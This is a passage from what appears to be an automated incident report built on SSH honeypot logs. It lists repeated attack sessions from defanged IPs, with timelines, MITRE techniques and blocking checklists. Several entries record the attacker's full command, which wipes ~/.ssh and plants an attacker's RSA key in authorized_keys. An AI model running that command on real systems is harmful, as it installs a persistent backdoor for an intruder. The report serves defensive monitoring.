| `2026-05-26 13:15:59` | `cowrie.command.failed` |
| `2026-05-26 13:16:00` | `cowrie.log.closed` |
| `2026-05-26 13:16:00` | `cowrie.session.params` |
| `2026-05-26 13:16:00` | `cowrie.command.input` |
| `2026-05-26 13:16:00` | `cowrie.session.file_download` |
| `2026-05-26 13:16:00` | `cowrie.log.closed` |
| `2026-05-26 13:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-768134fd55f7

| Field | Detail |
|---|---|
| **Source IP** | `186.31.95[.]163` |
| **First Seen** | 2026-05-26 13:16 |
| **Last Seen** | 2026-05-26 13:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:16:04` | `cowrie.session.connect` |
| `2026-05-26 13:16:04` | `cowrie.client.version` |
| `2026-05-26 13:16:04` | `cowrie.client.kex` |
| `2026-05-26 13:16:05` | `cowrie.login.success` |
| `2026-05-26 13:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.31.95[.]163` to AbuseIPDB if not already reported
- [ ] Block `186.31.95[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1e354caf99db

| Field | Detail |
|---|---|
| **Source IP** | `172.211.56[.]214` |
| **First Seen** | 2026-05-26 13:20 |
| **Last Seen** | 2026-05-26 13:20 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:20:07` | `cowrie.session.connect` |
| `2026-05-26 13:20:07` | `cowrie.client.version` |
| `2026-05-26 13:20:07` | `cowrie.client.kex` |
| `2026-05-26 13:20:08` | `cowrie.login.success` |
| `2026-05-26 13:20:08` | `cowrie.session.params` |
| `2026-05-26 13:20:08` | `cowrie.command.input` |
| `2026-05-26 13:20:08` | `cowrie.command.failed` |
| `2026-05-26 13:20:08` | `cowrie.log.closed` |
| `2026-05-26 13:20:08` | `cowrie.session.params` |
| `2026-05-26 13:20:08` | `cowrie.command.input` |
| `2026-05-26 13:20:09` | `cowrie.session.file_download` |
| `2026-05-26 13:20:09` | `cowrie.log.closed` |
| `2026-05-26 13:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.211.56[.]214` to AbuseIPDB if not already reported
- [ ] Block `172.211.56[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1a4f99cdd57

| Field | Detail |
|---|---|
| **Source IP** | `172.211.56[.]214` |
| **First Seen** | 2026-05-26 13:20 |
| **Last Seen** | 2026-05-26 13:20 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:20:11` | `cowrie.session.connect` |
| `2026-05-26 13:20:11` | `cowrie.client.version` |
| `2026-05-26 13:20:11` | `cowrie.client.kex` |
| `2026-05-26 13:20:11` | `cowrie.login.success` |
| `2026-05-26 13:20:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `172.211.56[.]214` to AbuseIPDB if not already reported
- [ ] Block `172.211.56[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-45853d112e05

| Field | Detail |
|---|---|
| **Source IP** | `120.48.80[.]70` |
| **First Seen** | 2026-05-26 13:25 |
| **Last Seen** | 2026-05-26 13:25 |
| **Session Duration** | 21s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:25:23` | `cowrie.session.connect` |
| `2026-05-26 13:25:23` | `cowrie.client.version` |
| `2026-05-26 13:25:23` | `cowrie.client.kex` |
| `2026-05-26 13:25:26` | `cowrie.login.success` |
| `2026-05-26 13:25:36` | `cowrie.session.params` |
| `2026-05-26 13:25:36` | `cowrie.command.input` |
| `2026-05-26 13:25:36` | `cowrie.session.file_download` |
| `2026-05-26 13:25:36` | `cowrie.log.closed` |
| `2026-05-26 13:25:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.80[.]70` to AbuseIPDB if not already reported
- [ ] Block `120.48.80[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25272cb98be6

| Field | Detail |
|---|---|
| **Source IP** | `120.48.80[.]70` |
| **First Seen** | 2026-05-26 13:25 |
| **Last Seen** | 2026-05-26 13:25 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:25:42` | `cowrie.session.connect` |
| `2026-05-26 13:25:42` | `cowrie.client.version` |
| `2026-05-26 13:25:42` | `cowrie.client.kex` |
| `2026-05-26 13:25:44` | `cowrie.login.success` |
| `2026-05-26 13:25:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.80[.]70` to AbuseIPDB if not already reported
- [ ] Block `120.48.80[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-930618539716

| Field | Detail |
|---|---|
| **Source IP** | `120.48.80[.]70` |
| **First Seen** | 2026-05-26 13:27 |
| **Last Seen** | 2026-05-26 13:27 |
| **Session Duration** | 15s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:27:20` | `cowrie.session.connect` |
| `2026-05-26 13:27:20` | `cowrie.client.version` |
| `2026-05-26 13:27:20` | `cowrie.client.kex` |
| `2026-05-26 13:27:21` | `cowrie.login.success` |
| `2026-05-26 13:27:22` | `cowrie.session.params` |
| `2026-05-26 13:27:22` | `cowrie.command.input` |
| `2026-05-26 13:27:22` | `cowrie.command.failed` |
| `2026-05-26 13:27:23` | `cowrie.log.closed` |
| `2026-05-26 13:27:26` | `cowrie.session.params` |
| `2026-05-26 13:27:26` | `cowrie.command.input` |
| `2026-05-26 13:27:26` | `cowrie.session.file_download` |
| `2026-05-26 13:27:26` | `cowrie.log.closed` |
| `2026-05-26 13:27:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.80[.]70` to AbuseIPDB if not already reported
- [ ] Block `120.48.80[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-448fbaf49eb6

| Field | Detail |
|---|---|
| **Source IP** | `120.48.80[.]70` |
| **First Seen** | 2026-05-26 13:27 |
| **Last Seen** | 2026-05-26 13:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:27:33` | `cowrie.session.connect` |
| `2026-05-26 13:27:33` | `cowrie.client.version` |
| `2026-05-26 13:27:33` | `cowrie.client.kex` |
| `2026-05-26 13:27:35` | `cowrie.login.success` |
| `2026-05-26 13:27:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.80[.]70` to AbuseIPDB if not already reported
- [ ] Block `120.48.80[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8483ce47962e

| Field | Detail |
|---|---|
| **Source IP** | `120.48.80[.]70` |
| **First Seen** | 2026-05-26 13:28 |
| **Last Seen** | 2026-05-26 13:28 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:28:16` | `cowrie.session.connect` |
| `2026-05-26 13:28:16` | `cowrie.client.version` |
| `2026-05-26 13:28:19` | `cowrie.client.kex` |
| `2026-05-26 13:28:21` | `cowrie.login.success` |
| `2026-05-26 13:28:22` | `cowrie.session.params` |
| `2026-05-26 13:28:22` | `cowrie.command.input` |
| `2026-05-26 13:28:22` | `cowrie.command.failed` |
| `2026-05-26 13:28:24` | `cowrie.log.closed` |
| `2026-05-26 13:28:25` | `cowrie.session.params` |
| `2026-05-26 13:28:25` | `cowrie.command.input` |
| `2026-05-26 13:28:25` | `cowrie.session.file_download` |
| `2026-05-26 13:28:25` | `cowrie.log.closed` |
| `2026-05-26 13:28:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.80[.]70` to AbuseIPDB if not already reported
- [ ] Block `120.48.80[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01f0f392d181

| Field | Detail |
|---|---|
| **Source IP** | `120.48.80[.]70` |
| **First Seen** | 2026-05-26 13:28 |
| **Last Seen** | 2026-05-26 13:28 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:28:28` | `cowrie.session.connect` |
| `2026-05-26 13:28:28` | `cowrie.client.version` |
| `2026-05-26 13:28:28` | `cowrie.client.kex` |
| `2026-05-26 13:28:31` | `cowrie.login.success` |
| `2026-05-26 13:28:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.80[.]70` to AbuseIPDB if not already reported
- [ ] Block `120.48.80[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-01cd307853eb

| Field | Detail |
|---|---|
| **Source IP** | `120.48.80[.]70` |
| **First Seen** | 2026-05-26 13:28 |
| **Last Seen** | 2026-05-26 13:28 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:28:47` | `cowrie.session.connect` |
| `2026-05-26 13:28:47` | `cowrie.client.version` |
| `2026-05-26 13:28:47` | `cowrie.client.kex` |
| `2026-05-26 13:28:48` | `cowrie.login.success` |
| `2026-05-26 13:28:49` | `cowrie.session.params` |
| `2026-05-26 13:28:49` | `cowrie.command.input` |
| `2026-05-26 13:28:49` | `cowrie.command.failed` |
| `2026-05-26 13:28:49` | `cowrie.log.closed` |
| `2026-05-26 13:28:51` | `cowrie.session.params` |
| `2026-05-26 13:28:51` | `cowrie.command.input` |
| `2026-05-26 13:28:51` | `cowrie.session.file_download` |
| `2026-05-26 13:28:51` | `cowrie.log.closed` |
| `2026-05-26 13:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.80[.]70` to AbuseIPDB if not already reported
- [ ] Block `120.48.80[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be9d5fa86b11

| Field | Detail |
|---|---|
| **Source IP** | `120.48.80[.]70` |
| **First Seen** | 2026-05-26 13:28 |
| **Last Seen** | 2026-05-26 13:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:28:56` | `cowrie.session.connect` |
| `2026-05-26 13:28:56` | `cowrie.client.version` |
| `2026-05-26 13:28:56` | `cowrie.client.kex` |
| `2026-05-26 13:28:58` | `cowrie.login.success` |
| `2026-05-26 13:28:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.80[.]70` to AbuseIPDB if not already reported
- [ ] Block `120.48.80[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea218014b925

| Field | Detail |
|---|---|
| **Source IP** | `120.48.80[.]70` |
| **First Seen** | 2026-05-26 13:29 |
| **Last Seen** | 2026-05-26 13:29 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:29:41` | `cowrie.session.connect` |
| `2026-05-26 13:29:41` | `cowrie.client.version` |
| `2026-05-26 13:29:42` | `cowrie.client.kex` |
| `2026-05-26 13:29:43` | `cowrie.login.success` |
| `2026-05-26 13:29:44` | `cowrie.session.params` |
| `2026-05-26 13:29:44` | `cowrie.command.input` |
| `2026-05-26 13:29:44` | `cowrie.command.failed` |
| `2026-05-26 13:29:45` | `cowrie.log.closed` |
| `2026-05-26 13:29:46` | `cowrie.session.params` |
| `2026-05-26 13:29:46` | `cowrie.command.input` |
| `2026-05-26 13:29:47` | `cowrie.session.file_download` |
| `2026-05-26 13:29:47` | `cowrie.log.closed` |
| `2026-05-26 13:29:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.80[.]70` to AbuseIPDB if not already reported
- [ ] Block `120.48.80[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd01bbe74fdd

| Field | Detail |
|---|---|
| **Source IP** | `120.48.80[.]70` |
| **First Seen** | 2026-05-26 13:29 |
| **Last Seen** | 2026-05-26 13:29 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:29:53` | `cowrie.session.connect` |
| `2026-05-26 13:29:53` | `cowrie.client.version` |
| `2026-05-26 13:29:53` | `cowrie.client.kex` |
| `2026-05-26 13:29:55` | `cowrie.login.success` |
| `2026-05-26 13:29:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.80[.]70` to AbuseIPDB if not already reported
- [ ] Block `120.48.80[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c46c94899df

| Field | Detail |
|---|---|
| **Source IP** | `120.48.80[.]70` |
| **First Seen** | 2026-05-26 13:30 |
| **Last Seen** | 2026-05-26 13:30 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:30:09` | `cowrie.session.connect` |
| `2026-05-26 13:30:09` | `cowrie.client.version` |
| `2026-05-26 13:30:10` | `cowrie.client.kex` |
| `2026-05-26 13:30:12` | `cowrie.login.success` |
| `2026-05-26 13:30:14` | `cowrie.session.params` |
| `2026-05-26 13:30:14` | `cowrie.command.input` |
| `2026-05-26 13:30:14` | `cowrie.command.failed` |
| `2026-05-26 13:30:14` | `cowrie.log.closed` |
| `2026-05-26 13:30:14` | `cowrie.session.params` |
| `2026-05-26 13:30:14` | `cowrie.command.input` |
| `2026-05-26 13:30:15` | `cowrie.session.file_download` |
| `2026-05-26 13:30:15` | `cowrie.log.closed` |
| `2026-05-26 13:30:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.80[.]70` to AbuseIPDB if not already reported
- [ ] Block `120.48.80[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-139686793ea6

| Field | Detail |
|---|---|
| **Source IP** | `120.48.80[.]70` |
| **First Seen** | 2026-05-26 13:30 |
| **Last Seen** | 2026-05-26 13:30 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:30:22` | `cowrie.session.connect` |
| `2026-05-26 13:30:22` | `cowrie.client.version` |
| `2026-05-26 13:30:22` | `cowrie.client.kex` |
| `2026-05-26 13:30:24` | `cowrie.login.success` |
| `2026-05-26 13:30:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.80[.]70` to AbuseIPDB if not already reported
- [ ] Block `120.48.80[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0b64cbb1f486

| Field | Detail |
|---|---|
| **Source IP** | `120.48.80[.]70` |
| **First Seen** | 2026-05-26 13:31 |
| **Last Seen** | 2026-05-26 13:31 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:31:35` | `cowrie.session.connect` |
| `2026-05-26 13:31:35` | `cowrie.client.version` |
| `2026-05-26 13:31:35` | `cowrie.client.kex` |
| `2026-05-26 13:31:37` | `cowrie.login.success` |
| `2026-05-26 13:31:38` | `cowrie.session.params` |
| `2026-05-26 13:31:38` | `cowrie.command.input` |
| `2026-05-26 13:31:38` | `cowrie.command.failed` |
| `2026-05-26 13:31:40` | `cowrie.log.closed` |
| `2026-05-26 13:31:40` | `cowrie.session.params` |
| `2026-05-26 13:31:40` | `cowrie.command.input` |
| `2026-05-26 13:31:41` | `cowrie.session.file_download` |
| `2026-05-26 13:31:41` | `cowrie.log.closed` |
| `2026-05-26 13:31:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.80[.]70` to AbuseIPDB if not already reported
- [ ] Block `120.48.80[.]70` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-174a021e5ac2

| Field | Detail |
|---|---|
| **Source IP** | `120.48.80[.]70` |
| **First Seen** | 2026-05-26 13:31 |
| **Last Seen** | 2026-05-26 13:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-26 13:31:46` | `cowrie.session.connect` |
| `2026-05-26 13:31:46` | `cowrie.client.version` |
| `2026-05-26 13:31:46` | `cowrie.client.kex` |
| `2026-05-26 13:31:47` | `cowrie.login.success` |
| `2026-05-26 13:31:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.48.80[.]70` to AbuseIPDB if not already reported
- [ ] Block `120.48.80[.]70` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-91389a793dcc

| Field | Detail |
|---|---|
| **Source IP** | `118.145.238[.]60` |
| **First Seen** | 2026-05-26 13:32 |
| **Last Seen** | 2026-05-26 13:32 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
